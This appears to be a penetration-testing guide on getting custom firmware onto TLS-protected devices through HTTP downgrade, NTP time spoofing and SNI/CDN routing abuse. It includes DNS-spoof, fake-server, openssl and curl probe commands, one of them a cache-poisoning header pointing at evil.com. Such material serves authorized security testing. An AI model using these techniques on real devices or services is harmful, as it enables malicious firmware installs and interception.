# Network-Level Attack Vectors for TLS-Protected Firmware Updates

This document describes potential attack vectors for delivering custom firmware to devices that implement TLS certificate validation. These techniques attempt to bypass or circumvent TLS protections through indirect means.

## 1. Protocol Downgrade Attack

### Overview

A protocol downgrade attack exploits fallback behavior in client applications. If a device fails to connect via HTTPS, it may automatically retry using unencrypted HTTP as a fallback mechanism.

### How It Works

```
Normal Flow:
Device -> DNS query -> update.example.com -> Real IP
Device -> HTTPS connection to Real IP:443 -> Success -> Download firmware

Attack Flow:
Device -> DNS query -> update.example.com -> 192.168.200.1 (spoofed)
Device -> HTTPS connection to 192.168.200.1:443 -> Certificate Error/Timeout
Device -> HTTP fallback to 192.168.200.1:80 -> Attacker serves fake firmware
```

### Attack Setup

1. **DNS Spoofing**: Redirect `update.example.com` to attacker-controlled IP
2. **Block Port 443**: Either don't listen on 443, or send RST packets
3. **Serve HTTP on Port 80**: Run a web server with malicious firmware

### Testing Method

```bash
# 1. Add to dns-spoof.conf
address=/update.example.com/192.168.200.1

# 2. Don't run any HTTPS proxy - let 443 fail

# 3. Run HTTP server on port 80
python3 -m http.server 80 --directory ./firmware/

# 4. Monitor for HTTP connections
tcpdump -i br0 port 80 and host <device-ip>
```

### Detection Signs

- Device makes HTTP request after HTTPS failure
- Firmware download succeeds despite no HTTPS service
- Traffic visible on port 80 in packet capture

### Likelihood: LOW

Most modern firmware implementations do not fall back to HTTP. However, some older devices or poorly implemented update mechanisms may have this vulnerability. This is particularly common in:
- Legacy IoT devices
- Devices with update code written before HTTPS-everywhere practices
- Embedded systems with minimal TLS libraries

---

## 2. Time-Based Attack (NTP Spoofing)

### Overview

TLS certificates have validity periods (Not Before / Not After dates). If a device doesn't properly validate certificate dates OR relies on network time (NTP) without authentication, an attacker can manipulate the device's system clock to make expired or not-yet-valid certificates appear valid.

### How It Works

```
Scenario A: Using an Expired Legitimate Certificate

Real certificate for update.example.com:
  Valid: 2024-01-01 to 2025-01-01
  Current date: 2025-12-12 (certificate expired)

Attack:
1. Obtain the expired but legitimately-signed certificate
2. Spoof NTP to set device clock to 2024-06-15
3. Device thinks certificate is valid
4. MITM attack succeeds with "valid" certificate

Scenario B: Using a Future Certificate

Attacker generates certificate:
  Valid: 2030-01-01 to 2031-01-01

Attack:
1. Spoof NTP to set device clock to 2030-06-15
2. Device accepts attacker's certificate as valid
```

### Attack Setup

```
+----------------------------------------------------------------+
|                         Attack Flow                             |
+----------------------------------------------------------------+

1. Device boots and requests time via NTP (UDP port 123)
   -> NTP request to pool.ntp.org (or configured NTP server)

2. Attacker intercepts NTP and returns spoofed time
   -> DNS spoof: pool.ntp.org -> 192.168.200.1
   -> Run fake NTP server returning year 2024

3. Device sets system clock to 2024

4. Device requests firmware update
   -> Attacker presents expired (but "valid" in 2024) certificate
   -> OR attacker presents certificate with manipulated dates

5. Device accepts certificate, downloads malicious firmware
```

### Testing Method

```bash
# 1. Install NTP spoofing tool (Delorean)
# Delorean: https://github.com/jselvi/Delorean

# 2. Start Delorean with time offset
sudo ./delorean.sh start +1500

# 3. Reboot device (forces NTP sync)

# 4. Check device's perceived time via its web UI or API

# 5. Attempt MITM with certificate valid for spoofed date
```

### Requirements

- Device must sync time via NTP (most IoT devices do)
- Device must not use authenticated NTP (NTS)
- Device must not have hardware RTC with battery backup
- OR device must trust network time over RTC

### Likelihood: MEDIUM

Many IoT devices:
- Have no battery-backed real-time clock (RTC)
- Rely entirely on NTP for time synchronization
- Don't implement NTP authentication (NTS)
- May have weak or no certificate date validation

---

## 3. SNI-Based Routing Exploitation

### Overview

Server Name Indication (SNI) is a TLS extension that allows a client to specify which hostname it's connecting to during the TLS handshake. CDNs and reverse proxies use SNI to route requests to the correct backend. Misconfigurations can allow attackers to serve content from unintended origins.

### How It Works

```
Normal CDN Behavior:
Client -> TLS ClientHello with SNI: update.example.com
CDN -> Routes to vendor's firmware bucket
CDN -> Returns firmware

Exploitation Scenarios:

Scenario A: Domain Fronting
Client -> Connect to CDN IP (legitimate)
Client -> TLS ClientHello with SNI: update.example.com
Client -> HTTP Host header: attacker.example.com
CDN -> Certificate valid for shared wildcard
CDN -> Routes based on Host header to attacker's content

Scenario B: Shared CDN Exploitation
If attacker has account on same CDN:
1. Attacker creates pull zone on same CDN
2. Attacker's origin serves malicious firmware
3. Find way to make device request from attacker's zone
   - DNS manipulation to resolve to same CDN edge
   - Exploit CDN routing logic
```

### Testing Method

```bash
# 1. Check what certificate the CDN serves
echo | openssl s_client -connect <cdn-ip>:443 -servername update.example.com 2>/dev/null | openssl x509 -noout -subject -issuer

# 2. Test with different SNI values
echo | openssl s_client -connect <cdn-ip>:443 -servername test.cdn.net 2>/dev/null | openssl x509 -noout -subject

# 3. Check if CDN serves different content based on Host header
curl -v --resolve update.example.com:443:<cdn-ip> \
     -H "Host: different-customer.cdn.net" \
     https://update.example.com/firmware

# 4. Look for path traversal or routing bugs
curl -v https://update.example.com/../../../other-customer/file

# 5. Check for cache poisoning vectors
curl -v https://update.example.com/firmware \
     -H "X-Forwarded-Host: evil.com"
```

### Likelihood: LOW-MEDIUM

This attack requires:
- CDN misconfiguration (increasingly rare)
- Attacker presence on same CDN infrastructure
- Specific routing vulnerabilities

---

## Summary Comparison

| Attack | Complexity | Prerequisites | Detection Risk | Success Rate |
|--------|------------|---------------|----------------|--------------|
| Downgrade | Low | DNS control only | Low | Very Low |
| NTP Spoof | Medium | DNS + NTP server | Medium | Medium |
| SNI/CDN | High | CDN account + research | High | Low |

## Recommended Testing Order

1. **Downgrade Attack** - Quick to test, rarely works but costs nothing
2. **NTP Spoofing** - Moderate setup, good chance on battery-less IoT
3. **SNI/CDN** - Requires research, only attempt if others fail

## Tools Referenced

- **Delorean**: NTP spoofing tool - https://github.com/jselvi/Delorean
- **Bettercap**: Network attack framework with NTP spoof module
- **mitmproxy**: For testing certificate acceptance
- **OpenSSL**: Certificate inspection and testing

## Legal Notice

These techniques should only be used:
- On devices you own
- In authorized penetration testing engagements
- For security research with proper disclosure
- In isolated lab environments

Unauthorized access to computer systems is illegal in most jurisdictions.
